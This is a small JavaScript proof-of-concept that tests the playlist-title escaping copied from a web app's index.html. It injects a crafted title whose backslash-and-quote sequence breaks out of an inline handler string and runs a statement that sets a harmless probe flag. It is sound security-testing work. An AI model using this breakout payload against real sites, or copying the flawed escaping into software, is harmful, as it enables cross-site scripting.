"use strict";

// Exact escaping pattern used by app/static/index.html for playlist titles.
const esc = (s) =>
  String(s ?? "").replace(/[&<>\"]/g, (c) =>
    ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]
  );

const syntheticTitle = "safe-prefix\\');globalThis.__deckpipeProbe=true;//";
const renderedTitle = esc(syntheticTitle).replace(/'/g, "\\'");
const inlineHandler = `selectPlaylist('123', '${renderedTitle}')`;

globalThis.__deckpipeProbe = false;
const selectPlaylist = () => {};
new Function("selectPlaylist", inlineHandler)(selectPlaylist);

console.log(
  JSON.stringify(
    {
      handler_compiles: true,
      injected_statement_executed: globalThis.__deckpipeProbe,
      finding: globalThis.__deckpipeProbe
        ? "backslash-plus-quote breaks out of the inline JavaScript string"
        : "probe did not execute",
    },
    null,
    2
  )
);
